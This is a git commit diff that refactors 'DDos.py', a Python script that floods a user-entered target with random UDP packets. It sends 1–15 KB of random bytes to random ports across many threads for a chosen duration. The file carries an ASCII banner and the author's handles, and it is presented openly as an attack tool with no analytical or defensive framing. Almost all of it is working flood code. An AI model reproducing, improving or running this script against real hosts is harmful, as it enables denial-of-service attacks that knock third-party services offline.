d1a891b7c0393ede06c7c02fc9ed1b4966d58861
hvrl <84303491+hvrrl@users.noreply.github.com>
2021-10-13 10:29:29 +0800

    Update DDos.py

--- DDos.py
+++ DDos.py
@@ -1,7 +1,6 @@
 import socket
 import random
 import threading
-import sys
 import time
 
 from os import system
@@ -21,49 +20,42 @@ def gui():
         | (   ) || |   | || (\ (   | |          
         | )   ( || (___) || ) \ \__| (____/\\   
         |/     \|(_______)|/   \__/(_______/    
-
        \x1b[38;5;56m[Discord] \x1b[31mhurl#8400 \x1b[38;5;56m[Github] \x1b[31mhvrrl                                    
 \x1b[31m╚═════════════════════════════════════════════════╝
 ''')
 
 def start():
-    gui()
-    global TARGET
-    global THREADS
-    global TIME
-    global timeout
-    try:
-        TARGET = str(input("ENTER YOUR TARGET: "))
-        THREADS = int(input("ENTER THREADS: "))
-        TIME = float(input("ENTER ATTACK DURATION: "))
-        timeout = time.time() + 1*TIME
-    except:
-        print("Invalid Input")
-    system("cls")
+     try:
+          target = str(input("ENTER YOUR TARGET: "))
+          threads = int(input("ENTER THREADS: "))
+          TIME = float(input("ENTER ATTACK DURATION: "))
+          timeout = time.time() + 1*TIME
+     except:
+          print("Invalid Input")
+          return 0
+     finally:
+          return (target, threads, TIME, timeout)
     
-def attack():
+def attack(timeout, target):
     try:
         bytes = random._urandom(1024)
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         while time.time() < timeout:
             dport = random.randint(20,55500)
-            sock.sendto(bytes*random.randint(5,15), (TARGET, dport))
+            sock.sendto(bytes*random.randint(5,15), (target, dport))
         return
-        sys.exit()
     except:
         pass
     
 def main():
     while True:
-        start()
-        for x in range(0, THREADS):
-            t1 = threading.Thread(target=attack)
-            t1.start()
-            t2 = threading.Thread(target=attack)
-            t2.start()
-
-        time.sleep(TIME)
-        system("cls")
+          gui()
+          target, threads, TIME, timeout = start()
+          for x in range(0, threads):
+               t1 = threading.Thread(target=attack, args=(timeout, target))
+               t1.start()
+          time.sleep(TIME)
+          system("cls")
 
 if __name__ == '__main__':
     main()
